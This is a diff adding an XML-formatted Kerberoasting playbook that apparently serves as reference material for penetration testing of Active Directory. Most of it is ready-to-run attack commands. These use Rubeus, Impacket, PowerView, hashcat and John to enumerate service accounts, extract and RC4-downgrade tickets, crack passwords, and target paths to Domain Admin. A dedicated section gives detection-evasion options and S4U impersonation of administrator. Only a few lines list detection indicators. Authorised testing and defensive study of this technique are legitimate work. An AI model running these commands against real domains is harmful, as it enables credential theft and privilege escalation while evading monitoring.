@@ -1,0 +1,156 @@
+<vulnerability_guide>
+  <title>KERBEROASTING - SERVICE ACCOUNT EXPLOITATION</title>
+
+  <critical>Kerberoasting exploits the Kerberos authentication protocol to extract service account password hashes offline. Any authenticated domain user can request service tickets (TGS) for accounts with Service Principal Names (SPNs), then crack these tickets offline without triggering account lockouts. This is one of the most reliable privilege escalation vectors in Active Directory environments.</critical>
+
+  <scope>
+    - Service accounts with SPNs registered in Active Directory
+    - Accounts running services (SQL Server, IIS, Exchange, custom applications)
+    - Machine accounts and managed service accounts (gMSA/sMSA)
+    - Cross-domain service accounts in forest trusts
+    - Service accounts with weak or predictable passwords
+  </scope>
+
+  <methodology>
+    1. **Enumerate SPNs**: Identify all accounts with registered Service Principal Names
+    2. **Request TGS tickets**: Use valid domain credentials to request service tickets
+    3. **Extract ticket hashes**: Export tickets in crackable format (Kirbi or Hashcat)
+    4. **Offline cracking**: Crack tickets using wordlists or brute force
+    5. **Validate credentials**: Test recovered credentials for privilege escalation
+  </methodology>
+
+  <advanced_techniques>
+    <spn_enumeration>
+      LDAP query to find all SPNs:
+      {% raw %}
+      # PowerShell - Native
+      Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
+
+      # LDAP Filter
+      (&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))
+
+      # Impacket - GetUserSPNs
+      GetUserSPNs.py -dc-ip DC_IP domain/user:password
+
+      # Rubeus enumeration
+      Rubeus.exe kerberoast /stats
+
+      # PowerView
+      Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname
+      {% endraw %}
+    </spn_enumeration>
+
+    <ticket_extraction>
+      Request and export service tickets:
+      {% raw %}
+      # Rubeus - Request all kerberoastable tickets
+      Rubeus.exe kerberoast /outfile:hashes.txt
+
+      # Rubeus - Target specific user
+      Rubeus.exe kerberoast /user:svc_sql /outfile:svc_sql.txt
+
+      # Rubeus - RC4 downgrade (more crackable)
+      Rubeus.exe kerberoast /tgtdeleg /outfile:hashes.txt
+
+      # Impacket - GetUserSPNs with hash output
+      GetUserSPNs.py -request -dc-ip DC_IP domain/user:password -outputfile hashes.txt
+
+      # PowerShell native (requires RSAT)
+      Add-Type -AssemblyName System.IdentityModel
+      New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/sql.domain.local:1433"
+      {% endraw %}
+    </ticket_extraction>
+
+    <hash_cracking>
+      Offline password cracking approaches:
+      {% raw %}
+      # Hashcat - Kerberos 5 TGS-REP (RC4)
+      hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule
+
+      # Hashcat - Kerberos 5 TGS-REP (AES256)
+      hashcat -m 19700 hashes.txt wordlist.txt
+
+      # John the Ripper
+      john --format=krb5tgs hashes.txt --wordlist=wordlist.txt
+
+      # Custom rules for service accounts
+      hashcat -m 13100 hashes.txt -a 3 ?u?l?l?l?l?l?d?d?s
+      {% endraw %}
+    </hash_cracking>
+
+    <targeted_kerberoasting>
+      Focus on high-value targets:
+      {% raw %}
+      # Find SPNs with admin group membership
+      Get-ADUser -Filter {ServicePrincipalName -ne "$null" -and AdminCount -eq 1} -Properties ServicePrincipalName,AdminCount
+
+      # BloodHound query for kerberoastable paths to DA
+      MATCH p=shortestPath((u:User {hasspn:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@DOMAIN.LOCAL"})) RETURN p
+
+      # Check last password set (older = weaker)
+      Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties PasswordLastSet | Sort-Object PasswordLastSet
+      {% endraw %}
+    </targeted_kerberoasting>
+
+    <evasion_techniques>
+      Reduce detection footprint:
+      {% raw %}
+      # Request tickets for specific encryption types
+      Rubeus.exe kerberoast /rc4opsec
+
+      # Spread requests over time
+      Rubeus.exe kerberoast /delay:1000 /jitter:30
+
+      # Use alternative ticket request methods
+      # Request via S4U2Self if you have a machine account
+      Rubeus.exe s4u /user:MACHINE$ /rc4:HASH /impersonateuser:administrator /msdsspn:cifs/target
+      {% endraw %}
+    </evasion_techniques>
+
+    <cross_domain_kerberoasting>
+      Attack across forest trusts:
+      {% raw %}
+      # Enumerate SPNs in trusted domain
+      GetUserSPNs.py -target-domain child.domain.local domain/user:password
+
+      # Request tickets using trust relationship
+      Rubeus.exe kerberoast /domain:child.domain.local /dc:dc.child.domain.local
+      {% endraw %}
+    </cross_domain_kerberoasting>
+  </advanced_techniques>
+
+  <validation>
+    - Successfully enumerate accounts with SPNs
+    - Extract valid TGS tickets in hashcat/john format
+    - Crack at least one service account password
+    - Verify cracked credentials authenticate successfully
+    - Document privilege level of compromised accounts
+  </validation>
+
+  <false_positives>
+    - Machine accounts (COMPUTER$) - typically have strong random passwords
+    - Managed Service Accounts (gMSA) - passwords automatically rotated
+    - Accounts with AES-only encryption may indicate stronger passwords
+    - High entropy passwords visible in cracking time estimates
+  </false_positives>
+
+  <detection_indicators>
+    - Event ID 4769 (Kerberos Service Ticket Operations) with RC4 encryption
+    - Unusual volume of TGS requests from single source
+    - TGS requests for services user doesn't typically access
+    - Requests for multiple SPNs in rapid succession
+  </detection_indicators>
+
+  <pro_tips>
+    - Focus on accounts with PasswordLastSet > 1 year ago
+    - Prioritize accounts with AdminCount=1 (privileged)
+    - RC4 tickets crack 10-100x faster than AES tickets
+    - Use /tgtdeleg with Rubeus for automatic RC4 downgrade
+    - Check for password reuse across service accounts
+    - Service accounts often follow naming patterns (svc_, sql_, iis_)
+    - Monitor for accounts that never expire - often service accounts
+    - Cross-reference SPNs with running services on target hosts
+  </pro_tips>
+
+  <remember>Kerberoasting requires only basic domain user access but can yield Domain Admin credentials if service accounts use weak passwords and have excessive privileges.</remember>
+</vulnerability_guide>
